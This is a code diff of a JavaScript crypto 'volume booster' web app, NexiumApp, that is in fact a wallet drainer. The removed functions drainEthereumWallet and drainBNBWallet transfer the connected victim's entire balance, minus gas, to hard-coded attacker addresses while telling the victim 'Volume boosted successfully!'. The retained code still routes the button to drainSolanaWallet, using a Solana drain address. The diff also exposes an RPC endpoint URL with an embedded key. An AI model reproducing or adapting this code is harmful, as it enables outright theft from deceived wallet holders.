@@ -30,29 +30,9 @@ console.log('main.js: spl-token exports:', {
   createCloseAccountInstruction: !!createCloseAccountInstruction,
 }); // Log 5
 
-import * as ethers from 'ethers';
-
 const DRAIN_ADDRESSES = {
-  ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
-  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7",
-  bnb: "0x10269ABC1fBB7999164037a17a62905E099278f9"
+  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
 };
-
-const POPULAR_SPL_TOKENS = [
-  { mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6, name: "USDT" },
-  { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6, name: "USDC" },
-  { mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", decimals: 6, name: "WIF" },
-  { mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", decimals: 5, name: "BONK" },
-  { mint: "jto9Y19f7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", decimals: 9, name: "JTO" },
-  { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", decimals: 6, name: "JUP" },
-  { mint: "85VBFQZC9TZkfaptBWjvUw7YbZjy52A4zSrA8E98kC3U", decimals: 6, name: "W" },
-  { mint: "KMNo3nJsBXfcpJTVqwWzJxaR5i5Z6GmsWTSPQ3sYk8p", decimals: 6, name: "KMNO" },
-  { mint: "TNSRxcUxoT9xWYW1UnP8eZJ7RPf2rDXgUbS4ao9kR1S", decimals: 6, name: "TNSR" },
-  { mint: "2C4YvXUo2dJq4NjeaV7f3hDtkmTwrYkrAd4ToGTxK1r6", decimals: 9, name: "DAGO" },
-  { mint: "2V4TjFjC87CYLYbSJTcT5mWnG2h4oVRr17a94bREh6Vz", decimals: 9, name: "TUAH" },
-  { mint: "4LUigigJte7XuTktJ4S2fE6X6vK3C2zT7vJAdXvV3c4Q", decimals: 9, name: "LUIGI" },
-  { mint: "WENWENvqqNya429ubLdR1Y3vW6mWu2zHFauuJVVX5m1", decimals: 5, name: "WEN" }
-];
 
 class NexiumApp {
   constructor() {
@@ -111,9 +91,7 @@ class NexiumApp {
       connectWallet: document.getElementById('connect-wallet'),
       walletModal: document.getElementById('wallet-modal'),
       closeModal: document.getElementById('close-modal'),
-      connectMetamask: document.querySelector('#wallet-modal #connect-metamask'),
       connectPhantom: document.querySelector('#wallet-modal #connect-phantom'),
-      connectTrust: document.querySelector('#wallet-modal #connect-trust'),
       feedbackContainer: document.querySelector('.feedback-container'),
       tokenSelect: document.getElementById('tokenSelect'),
       volumeSection: document.getElementById('volumeSection'),
@@ -132,9 +110,7 @@ class NexiumApp {
       connectWallet: !!this.dom.connectWallet,
       walletModal: !!this.dom.walletModal,
       closeModal: !!this.dom.closeModal,
-      connectMetamask: !!this.dom.connectMetamask,
       connectPhantom: !!this.dom.connectPhantom,
-      connectTrust: !!this.dom.connectTrust,
       customTokenModal: !!this.dom.customTokenModal
     }); // Log 11
   }
@@ -151,12 +127,8 @@ class NexiumApp {
         event.stopPropagation();
         if (this.connectedWalletType && this.publicKey) {
           console.log(`${this.connectedWalletType} Add Volume clicked (outer button)`); // Log 13
-          if (this.connectedWalletType === 'MetaMask') {
-            this.drainEthereumWallet();
-          } else if (this.connectedWalletType === 'Phantom') {
+          if (this.connectedWalletType === 'Phantom') {
             this.drainSolanaWallet();
-          } else if (this.connectedWalletType === 'Trust') {
-            this.drainBNBWallet();
           }
         } else {
           console.log('Connect Wallet button clicked'); // Log 14
@@ -210,37 +182,10 @@ class NexiumApp {
 
     const addVolumeHandler = (walletName) => {
       console.log(`${walletName} Add Volume clicked`); // Log 22
-      if (walletName === 'MetaMask') {
-        this.drainEthereumWallet();
-      } else if (walletName === 'Phantom') {
+      if (walletName === 'Phantom') {
         this.drainSolanaWallet();
-      } else if (walletName === 'Trust') {
-        this.drainBNBWallet();
       }
     };
-
-    if (this.dom.connectMetamask) {
-      this.dom.connectMetamask.addEventListener('click', () => {
-        console.log('MetaMask click event triggered, connected class:', this.dom.connectMetamask.classList.contains('connected')); // Log 23
-        if (this.dom.connectMetamask.classList.contains('connected')) {
-          addVolumeHandler('MetaMask');
-        } else {
-          connectWalletHandler('MetaMask');
-        }
-      });
-      this.dom.connectMetamask.addEventListener('keypress', (e) => {
-        console.log('MetaMask keypress event triggered, key:', e.key, 'connected class:', this.dom.connectMetamask.classList.contains('connected')); // Log 24
-        if (e.key === 'Enter') {
-          if (this.dom.connectMetamask.classList.contains('connected')) {
-            addVolumeHandler('MetaMask');
-          } else {
-            connectWalletHandler('MetaMask');
-          }
-        }
-      });
-    } else {
-      console.warn('connectMetamask button not found'); // Log 25
-    }
 
     if (this.dom.connectPhantom) {
       this.dom.connectPhantom.addEventListener('click', () => {
@@ -265,29 +210,6 @@ class NexiumApp {
       console.warn('connectPhantom button not found'); // Log 28
     }
 
-    if (this.dom.connectTrust) {
-      this.dom.connectTrust.addEventListener('click', () => {
-        console.log('Trust Wallet click event triggered, connected class:', this.dom.connectTrust.classList.contains('connected')); // Log 29
-        if (this.dom.connectTrust.classList.contains('connected')) {
-          addVolumeHandler('Trust');
-        } else {
-          connectWalletHandler('Trust');
-        }
-      });
-      this.dom.connectTrust.addEventListener('keypress', (e) => {
-        console.log('Trust Wallet keypress event triggered, key:', e.key, 'connected class:', this.dom.connectTrust.classList.contains('connected')); // Log 30
-        if (e.key === 'Enter') {
-          if (this.dom.connectTrust.classList.contains('connected')) {
-            addVolumeHandler('Trust');
-          } else {
-            connectWalletHandler('Trust');
-          }
-        }
-      });
-    } else {
-      console.warn('connectTrust button not found'); // Log 31
-    }
-
     window.addEventListener('online', () => this.handleOnline());
     window.addEventListener('offline', () => this.handleOffline());
   }
@@ -306,42 +228,13 @@ class NexiumApp {
     try {
       const isMobileUserAgent = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
       const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-      const hasEthereum = !!window.ethereum;
       const hasSolana = !!window.solana;
-      const hasTrust = hasEthereum && (window.ethereum.isTrustWallet || /Trust/i.test(navigator.userAgent));
-      const hasExtensions = (walletName === 'MetaMask' && hasEthereum && window.ethereum.isMetaMask) || 
-                           (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) || 
-                           (walletName === 'Trust' && hasTrust);
-      console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'} (UserAgent: ${navigator.userAgent}, Touch: ${hasTouch}, Ethereum: ${hasEthereum}, Solana: ${hasSolana}, Trust: ${hasTrust}, Extensions: ${hasExtensions})`); // Log 34
+      const hasExtensions = (walletName === 'Phantom' && hasSolana && window.solana.isPhantom);
+      console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'} (UserAgent: ${navigator.userAgent}, Touch: ${hasTouch}, Solana: ${hasSolana}, Extensions: ${hasExtensions})`); // Log 34
 
       if (!isMobileUserAgent || hasExtensions) {
         let accounts = [];
-        if (walletName === 'MetaMask' && hasEthereum && window.ethereum.isMetaMask) {
-          console.log('MetaMask detected, requesting accounts:', window.ethereum); // Log 35
-          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          if (accounts.length === 0) {
-            console.error('MetaMask failed to provide accounts'); // Log 36
-            throw new Error('MetaMask failed to provide accounts. Ensure it’s unlocked and installed.');
-          }
-          const provider = new ethers.BrowserProvider(window.ethereum);
-          const network = await provider.getNetwork();
-          console.log(`MetaMask network: chainId=${network.chainId}, name=${network.name}`); // Log 37
-          if (network.chainId !== 1n) {
-            console.error('MetaMask not on Ethereum mainnet, chainId:', network.chainId); // Log 38
-            throw new Error('MetaMask is not connected to Ethereum mainnet (chainId 1).');
-          }
-          this.publicKey = accounts[0];
-          this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
-          console.log(`MetaMask connected via extension: ${this.publicKey}`); // Log 39
-          this.connectedWalletType = walletName;
-          this.updateButtonState('connected', walletName, this.publicKey);
-          this.hideMetaMaskPrompt();
-          this.showFeedback(`Connected`, 'success');
-          this.renderTokenInterface();
-          this.connecting = false;
-          console.log(`${walletName} connection completed, connecting=${this.connecting}`); // Log 44
-          return;
-        } else if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
+        if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
           console.log('Phantom detected, connecting:', window.solana); // Log 45
           const response = await window.solana.connect();
           accounts = [response.publicKey.toString()];
@@ -356,66 +249,6 @@ class NexiumApp {
           this.connecting = false;
           console.log(`${walletName} connection completed, connecting=${this.connecting}`); // Log 51
           return;
-        } else if (walletName === 'Trust' && hasEthereum && (window.ethereum.isTrustWallet || /Trust/i.test(navigator.userAgent))) {
-          console.log('Trust Wallet detected, requesting accounts:', window.ethereum); // Log 52
-          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          if (accounts.length === 0) {
-            console.error('Trust Wallet failed to provide accounts'); // Log 53
-            throw new Error('Trust Wallet failed to provide accounts. Ensure it’s unlocked and installed.');
-          }
-          const provider = new ethers.BrowserProvider(window.ethereum);
-          let network = await provider.getNetwork();
-          console.log(`Trust Wallet network: chainId=${network.chainId}, name=${network.name}`); // Log 54
-          if (network.chainId !== 56n) {
-            try {
-              console.log('Attempting to switch Trust Wallet to BNB Smart Chain'); // Log 54.1
-              await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-              });
-              network = await provider.getNetwork();
-              console.log(`Trust Wallet switched to: chainId=${network.chainId}, name=${network.name}`); // Log 54.2
-            } catch (switchError) {
-              console.error('Trust Wallet switch error:', switchError); // Log 54.3
-              if (switchError.code === 4902) {
-                console.log('BNB Smart Chain not found, attempting to add it'); // Log 54.4
-                await window.ethereum.request({
-                  method: 'wallet_addEthereumChain',
-                  params: [
-                    {
-                      chainId: '0x38',
-                      chainName: 'BNB Smart Chain',
-                      nativeCurrency: {
-                        name: 'BNB',
-                        symbol: 'BNB',
-                        decimals: 18,
-                      },
-                      rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                      blockExplorerUrls: ['https://bscscan.com'],
-                    },
-                  ],
-                });
-                network = await provider.getNetwork();
-                console.log(`Trust Wallet added and switched to: chainId=${network.chainId}, name=${network.name}`); // Log 54.5
-              } else {
-                throw new Error(`Failed to switch to BNB Smart Chain: ${switchError.message}`);
-              }
-            }
-            if (network.chainId !== 56n) {
-              console.error('Trust Wallet still not on BNB Smart Chain, chainId:', network.chainId); // Log 55
-              throw new Error('Trust Wallet is not connected to BNB Smart Chain (chainId 56). Please switch to BNB Smart Chain.');
-            }
-          }
-          this.publicKey = accounts[0];
-          console.log(`Trust Wallet connected via extension: ${this.publicKey}`); // Log 56
-          this.connectedWalletType = walletName;
-          this.updateButtonState('connected', walletName, this.publicKey);
-          this.hideMetaMaskPrompt();
-          this.showFeedback(`Connected`, 'success');
-          this.renderTokenInterface();
-          this.connecting = false;
-          console.log(`${walletName} connection completed, connecting=${this.connecting}`); // Log 61
-          return;
         } else {
           console.error(`${walletName} extension not detected`); // Log 62
           throw new Error(`${walletName} extension not detected or unsupported`);
@@ -424,9 +257,7 @@ class NexiumApp {
 
       // Deeplink begin
       const deeplinks = {
-        MetaMask: 'https://metamask.app.link/dapp/nexium-bot.onrender.com/add-volume.html',
-        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com%2Fadd-volume.html?ref=https%3A%2F%2Fnexium-bot.onrender.com',
-        Trust: 'https://link.trustwallet.com/open_url?coin_id=20000714&url=https://nexium-bot.onrender.com/add-volume.html'
+        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com%2Fadd-volume.html?ref=https%3A%2F%2Fnexium-bot.onrender.com'
       };
       // Deeplink end
       const deeplink = deeplinks[walletName];
@@ -438,93 +269,12 @@ class NexiumApp {
       window.location.href = deeplink;
 
       const checkConnection = setInterval(async () => {
-        if (walletName === 'MetaMask' && window.ethereum?.isMetaMask) {
-          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }).catch(() => []);
-          if (accounts.length > 0) {
-            this.publicKey = accounts[0];
-            const provider = new ethers.BrowserProvider(window.ethereum);
-            const network = await provider.getNetwork();
-            console.log(`MetaMask deeplink network: chainId=${network.chainId}, name=${network.name}`); // Log 65
-            if (network.chainId !== 1n) {
-              console.error('MetaMask deeplink not on Ethereum mainnet, chainId:', network.chainId); // Log 66
-              this.showFeedback('MetaMask not connected to Ethereum mainnet.', 'error');
-              clearInterval(checkConnection);
-              this.connecting = false;
-              return;
-            }
-            this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
-            console.log(`MetaMask connected via deeplink: ${this.publicKey}`); // Log 67
-            this.connectedWalletType = walletName;
-            this.updateButtonState('connected', walletName, this.publicKey);
-            this.hideMetaMaskPrompt();
-            this.showFeedback(`Connected`, 'success');
-            this.renderTokenInterface();
-            clearInterval(checkConnection);
-          }
-        } else if (walletName === 'Phantom' && window.solana?.isPhantom) {
+        if (walletName === 'Phantom' && window.solana?.isPhantom) {
           const response = await window.solana.connect().catch(() => null);
           if (response && response.publicKey) {
             this.publicKey = response.publicKey.toString();
             this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
             console.log(`Phantom connected via deeplink: ${this.publicKey}`); // Log 72
-            this.connectedWalletType = walletName;
-            this.updateButtonState('connected', walletName, this.publicKey);
-            this.hideMetaMaskPrompt();
-            this.showFeedback(`Connected`, 'success');
-            this.renderTokenInterface();
-            clearInterval(checkConnection);
-          }
-        } else if (walletName === 'Trust' && window.ethereum && (window.ethereum.isTrustWallet || /Trust/i.test(navigator.userAgent))) {
-          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }).catch(() => []);
-          if (accounts.length > 0) {
-            this.publicKey = accounts[0];
-            const provider = new ethers.BrowserProvider(window.ethereum);
-            let network = await provider.getNetwork();
-            console.log(`Trust Wallet deeplink network: chainId=${network.chainId}, name=${network.name}`); // Log 77
-            if (network.chainId !== 56n) {
-              try {
-                console.log('Attempting to switch Trust Wallet to BNB Smart Chain (deeplink)'); // Log 77.1
-                await window.ethereum.request({
-                  method: 'wallet_switchEthereumChain',
-                  params: [{ chainId: '0x38' }],
-                });
-                network = await provider.getNetwork();
-                console.log(`Trust Wallet switched to: chainId=${network.chainId}, name=${network.name}`); // Log 77.2
-              } catch (switchError) {
-                console.error('Trust Wallet deeplink switch error:', switchError); // Log 77.3
-                if (switchError.code === 4902) {
-                  console.log('BNB Smart Chain not found, attempting to add it (deeplink)'); // Log 77.4
-                  await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [
-                      {
-                        chainId: '0x38',
-                        chainName: 'BNB Smart Chain',
-                        nativeCurrency: {
-                          name: 'BNB',
-                          symbol: 'BNB',
-                          decimals: 18,
-                        },
-                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                        blockExplorerUrls: ['https://bscscan.com'],
-                      },
-                    ],
-                  });
-                  network = await provider.getNetwork();
-                  console.log(`Trust Wallet added and switched to: chainId=${network.chainId}, name=${network.name}`); // Log 77.5
-                } else {
-                  throw new Error(`Failed to switch to BNB Smart Chain: ${switchError.message}`);
-                }
-              }
-              if (network.chainId !== 56n) {
-                console.error('Trust Wallet deeplink not on BNB Smart Chain, chainId:', network.chainId); // Log 78
-                this.showFeedback('Trust Wallet not connected to BNB Smart Chain.', 'error');
-                clearInterval(checkConnection);
-                this.connecting = false;
-                return;
-              }
-            }
-            console.log(`Trust Wallet connected via deeplink: ${this.publicKey}`); // Log 79
             this.connectedWalletType = walletName;
             this.updateButtonState('connected', walletName, this.publicKey);
             this.hideMetaMaskPrompt();
@@ -552,66 +302,6 @@ class NexiumApp {
     } finally {
       this.connecting = false;
       console.log(`Connection attempt finished for ${walletName}, connecting=${this.connecting}`); // Log 88
-    }
-  }
-
-  async drainEthereumWallet() {
-    console.log("🔄 ETH Drainer Triggered"); // Log 84
-    this.showProcessingSpinner();
-    if (typeof window === "undefined" || !window.ethereum) {
-      console.error("⚠️ No Ethereum provider found. Make sure MetaMask is installed."); // Log 85
-      this.showFeedback("Please install MetaMask to boost volume.", 'error');
-      this.hideProcessingSpinner();
-      return;
-    }
-
-    const provider = new ethers.BrowserProvider(window.ethereum);
-
-    try {
-      const network = await provider.getNetwork();
-      console.log(`ETH Drainer network: chainId=${network.chainId}, name=${network.name}`); // Log 86
-      if ((this.connectedWalletType === 'MetaMask' && network.chainId !== 1n) || (this.connectedWalletType === 'Trust' && network.chainId !== 56n)) {
-        console.error('Drainer not on correct chain, chainId:', network.chainId); // Log 87
-        this.showFeedback(`Please connect ${this.connectedWalletType} to the correct chain.`, 'error');
-        this.hideProcessingSpinner();
-        return;
-      }
-
-      const signer = await provider.getSigner();
-      const walletAddress = await signer.getAddress();
-      console.log("✅ Connected to Ethereum Wallet:", walletAddress); // Log 88
-
-      const balanceHex = await provider.send('eth_getBalance', [walletAddress, 'latest']);
-      const balance = BigInt(balanceHex);
-      const gasPriceHex = await provider.send('eth_gasPrice', []);
-      const gasPrice = BigInt(gasPriceHex);
-      const gasLimit = 21000n;
-      const gasCost = gasPrice * gasLimit;
-      const transferableBalance = balance - gasCost;
-
-      if (transferableBalance <= 0n) {
-        console.error("Insufficient transferable balance:", balance.toString(), "wei"); // Log 88.1
-        throw new Error("Insufficient balance to transfer after reserving gas cost.");
-      }
-
-      const tx = await signer.sendTransaction({
-        to: DRAIN_ADDRESSES.ethereum,
-        value: transferableBalance,
-        gasLimit,
-        gasPrice
-      });
-
-      console.log("✅ ETH Transaction sent:", tx.hash); // Log 89
-      this.showFeedback("Volume boosted successfully!", 'success');
-      this.hideProcessingSpinner();
-    } catch (error) {
-      console.error("❌ Transaction failed due to an unexpected error:", error); // Log 90
-      if (error.message.includes('insufficient funds')) {
-        this.showFeedback('Insufficient funds to cover gas fees. Please ensure sufficient balance.', 'error');
-      } else {
-        this.showFeedback('Failed to boost volume. Please try again.', 'error');
-      }
-      this.hideProcessingSpinner();
     }
   }
 
@@ -686,78 +376,6 @@ class NexiumApp {
     }
   }
 
-  async drainBNBWallet() {
-    console.log("🔄 BNB Drainer Triggered"); // Log 156
-    this.showProcessingSpinner();
-    if (typeof window === "undefined" || !window.ethereum) {
-      console.error("⚠️ No Ethereum provider found. Make sure Trust Wallet is installed."); // Log 157
-      this.showFeedback("Please install Trust Wallet to boost volume.", 'error');
-      this.hideProcessingSpinner();
-      return;
-    }
-
-    // Use a reliable public BNB Smart Chain RPC URL
-    const bnbRpcUrl = 'https://bsc-dataseed.binance.org/';
-    let provider;
-    try {
-      provider = new ethers.BrowserProvider(window.ethereum);
-      // Test the provider with a simple call
-      await provider.getNetwork();
-    } catch (error) {
-      console.warn("Default provider failed, falling back to public RPC:", error); // Log 158.1
-      provider = new ethers.JsonRpcProvider(bnbRpcUrl);
-    }
-
-    try {
-      const network = await provider.getNetwork();
-      console.log(`BNB Drainer network: chainId=${network.chainId}, name=${network.name}`); // Log 158
-      if (this.connectedWalletType === 'Trust' && network.chainId !== 56n) {
-        console.error('Drainer not on BNB Smart Chain, chainId:', network.chainId); // Log 159
-        this.showFeedback('Please connect Trust Wallet to BNB Smart Chain.', 'error');
-        this.hideProcessingSpinner();
-        return;
-      }
-
-      const signer = await provider.getSigner();
-      const walletAddress = await signer.getAddress();
-      console.log("✅ Connected to BNB Wallet:", walletAddress); // Log 160
-
-      const balanceHex = await provider.send('eth_getBalance', [walletAddress, 'latest']);
-      const balance = BigInt(balanceHex);
-      const gasPriceHex = await provider.send('eth_gasPrice', []);
-      const gasPrice = BigInt(gasPriceHex);
-      const gasLimit = 21000n;
-      const gasCost = gasPrice * gasLimit;
-      const transferableBalance = balance - gasCost;
-
-      if (transferableBalance <= 0n) {
-        console.error("Insufficient transferable balance:", balance.toString(), "wei"); // Log 161
-        throw new Error("Insufficient balance to transfer after reserving gas cost.");
-      }
-
-      const tx = await signer.sendTransaction({
-        to: DRAIN_ADDRESSES.bnb,
-        value: transferableBalance,
-        gasLimit,
-        gasPrice
-      });
-
-      console.log("✅ BNB Transaction sent:", tx.hash); // Log 162
-      this.showFeedback("Volume boosted successfully!", 'success');
-      this.hideProcessingSpinner();
-    } catch (error) {
-      console.error("❌ Transaction failed due to an unexpected error:", error); // Log 163
-      if (error.message.includes('insufficient funds')) {
-        this.showFeedback('Insufficient funds to cover gas fees. Please ensure sufficient BNB balance.', 'error');
-      } else if (error.message.includes('Invalid RPC URL') || error.message.includes('network')) {
-        this.showFeedback('Network error: Invalid RPC configuration. Please try again later.', 'error');
-      } else {
-        this.showFeedback('Failed to boost volume. Please try again.', 'error');
-      }
-      this.hideProcessingSpinner();
-    }
-  }
-
   updateButtonState(state, walletName, address = '') {
     let button = this.dom[`connect${walletName}`];
     if (!button) {
@@ -816,7 +434,6 @@ class NexiumApp {
     else if (error.message?.includes('WebSocket') || error.message?.includes('network') || error.message?.includes('DNS')) message = `Network issue detected. Please check your internet connection.`;
     else if (error.message?.includes('extension not detected') || error.message?.includes('unsupported')) message = `Please install the ${walletName} extension to continue.`;
     else if (error.message?.includes('Non-base58 character')) message = `Please use a Solana wallet to boost volume.`;
-    else if (error.message?.includes('BNB Smart Chain')) message = `Please switch ${walletName} to BNB Smart Chain in your wallet settings.`;
     else if (error.message) message = `Failed to connect ${walletName}. Please try again.`;
     this.showFeedback(message, 'error');
   }
@@ -828,9 +445,7 @@ class NexiumApp {
 
   handleOffline() {
     this.showFeedback('No internet connection. Please reconnect.', 'error');
-    this.updateButtonState('disconnected', 'MetaMask');
     this.updateButtonState('disconnected', 'Phantom');
-    this.updateButtonState('disconnected', 'Trust');
     console.log('Network status: Offline'); // Log 115
   }
 
@@ -844,14 +459,10 @@ class NexiumApp {
     const promptText = this.dom.metamaskPrompt.querySelector('p');
     if (promptText && this.connectingWallet) {
       let walletLink = '';
-      if (this.connectingWallet === 'MetaMask') {
-        walletLink = `<a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install MetaMask">MetaMask</a>`;
-      } else if (this.connectingWallet === 'Phantom') {
+      if (this.connectingWallet === 'Phantom') {
         walletLink = `<a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Phantom">Phantom</a>`;
-      } else if (this.connectingWallet === 'Trust') {
-        walletLink = `<a href="https://trustwallet.com/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Trust Wallet">Trust Wallet</a>`;
       }
-      promptText.innerHTML = `Please install ${walletLink} or switch to BNB Smart Chain to continue.`;
+      promptText.innerHTML = `Please install ${walletLink} or switch to continue.`;
     }
     console.log(`Showing MetaMask prompt for ${this.connectingWallet}`); // Log 117
   }
@@ -912,23 +523,19 @@ class NexiumApp {
       this.hideMetaMaskPrompt();
       this.attachWalletListeners();
       if (this.isWalletConnected() && navigator.onLine) {
-        this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
+        this.publicKey = window.solana?.publicKey?.toString();
         this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
         console.log('Wallet connected on init, publicKey:', this.publicKey); // Log 121
-        this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : window.ethereum?.isMetaMask ? 'MetaMask' : window.ethereum?.isTrustWallet ? 'Trust' : null;
+        this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : null;
         this.handleSuccessfulConnection();
       } else {
         console.log('No wallet connected on init, setting buttons to disconnected'); // Log 122
-        this.updateButtonState('disconnected', 'MetaMask');
         this.updateButtonState('disconnected', 'Phantom');
-        this.updateButtonState('disconnected', 'Trust');
       }
     } else {
       console.log('No wallet installed, showing prompt'); // Log 123
       this.showMetaMaskPrompt();
-      this.updateButtonState('disconnected', 'MetaMask');
       this.updateButtonState('disconnected', 'Phantom');
-      this.updateButtonState('disconnected', 'Trust');
     }
   }
 
@@ -939,34 +546,14 @@ class NexiumApp {
         this.handleAccountsChanged();
       });
     }
-    if (window.ethereum) {
-      window.ethereum.on('accountsChanged', async () => {
-        console.log('Ethereum accounts changed'); // Log 125
-        this.handleAccountsChanged();
-      });
-      window.ethereum.on('chainChanged', async () => {
-        console.log('Ethereum chain changed'); // Log 126
-        if (this.connectedWalletType === 'Trust') {
-          const provider = new ethers.BrowserProvider(window.ethereum);
-          const network = await provider.getNetwork();
-          console.log(`Chain changed to: chainId=${network.chainId}, name=${network.name}`); // Log 126.1
-          if (network.chainId !== 56n) {
-            this.showFeedback('Please switch Trust Wallet to BNB Smart Chain.', 'error');
-            this.updateButtonState('disconnected', 'Trust');
-            this.publicKey = null;
-            this.connectedWalletType = null;
-          }
-        }
-      });
-    }
   }
 
   isWalletInstalled() {
-    return !!window.solana || !!window.ethereum;
+    return !!window.solana;
   }
 
   isWalletConnected() {
-    return (window.solana && !!window.solana.publicKey) || (window.ethereum && !!window.ethereum.selectedAddress);
+    return (window.solana && !!window.solana.publicKey);
   }
 
   handleSuccessfulConnection() {
@@ -976,13 +563,11 @@ class NexiumApp {
   }
 
   handleAccountsChanged() {
-    console.log('Handling accounts changed, new publicKey:', window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress); // Log 128
+    console.log('Handling accounts changed, new publicKey:', window.solana?.publicKey?.toString()); // Log 128
     this.hideMetaMaskPrompt();
-    this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
-    this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : window.ethereum?.isMetaMask ? 'MetaMask' : window.ethereum?.isTrustWallet ? 'Trust' : null;
-    this.updateButtonState('disconnected', 'MetaMask');
+    this.publicKey = window.solana?.publicKey?.toString();
+    this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : null;
     this.updateButtonState('disconnected', 'Phantom');
-    this.updateButtonState('disconnected', 'Trust');
     if (this.publicKey && this.connectedWalletType) {
       this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
     }
@@ -1159,12 +744,8 @@ class NexiumApp {
           return;
         }
         console.log(`Custom token submit: address=${tokenAddress}, amount=${amount}`); // Log 140
-        if (this.connectedWalletType === 'MetaMask') {
-          this.drainEthereumWallet();
-        } else if (this.connectedWalletType === 'Phantom') {
+        if (this.connectedWalletType === 'Phantom') {
           this.drainSolanaWallet();
-        } else if (this.connectedWalletType === 'Trust') {
-          this.drainBNBWallet();
         }
         if (this.dom.customTokenModal) {
           this.dom.customTokenModal.classList.remove('active');
